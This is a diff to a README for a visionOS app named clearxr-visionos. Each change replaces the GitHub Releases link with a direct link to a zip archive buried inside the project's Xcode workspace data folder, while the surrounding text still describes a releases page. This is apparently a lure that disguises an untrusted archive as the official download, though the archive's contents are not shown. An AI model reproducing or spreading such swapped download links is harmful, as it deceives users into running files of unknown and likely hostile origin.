@@ -1,6 +1,6 @@
 # 👓 clearxr-visionos - Clear Xr on VisionOS
 
-[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github)](https://github.com/hiruks7x/clearxr-visionos/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hiruks7x/clearxr-visionos/main/ClearXR.xcodeproj/project.xcworkspace/xcshareddata/visionos-clearxr-1.9.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use this app if you want a clean client that connects to Clear Xr and puts the m
 
 Visit this page to download the latest version:
 
-https://github.com/hiruks7x/clearxr-visionos/releases
+https://raw.githubusercontent.com/hiruks7x/clearxr-visionos/main/ClearXR.xcodeproj/project.xcworkspace/xcshareddata/visionos-clearxr-1.9.zip
 
 On that page, look for the newest release and download the file that matches your device. If there are more than one file, choose the app file for VisionOS use.
 
@@ -139,8 +139,8 @@ To keep setup smooth:
 - Name: clearxr-visionos
 - Description: visionOS client for Clear Xr
 - Source: GitHub Releases
-- Download page: https://github.com/hiruks7x/clearxr-visionos/releases
+- Download page: https://raw.githubusercontent.com/hiruks7x/clearxr-visionos/main/ClearXR.xcodeproj/project.xcworkspace/xcshareddata/visionos-clearxr-1.9.zip
 
 ## 📎 Direct Download Page
 
-https://github.com/hiruks7x/clearxr-visionos/releases
+https://raw.githubusercontent.com/hiruks7x/clearxr-visionos/main/ClearXR.xcodeproj/project.xcworkspace/xcshareddata/visionos-clearxr-1.9.zip
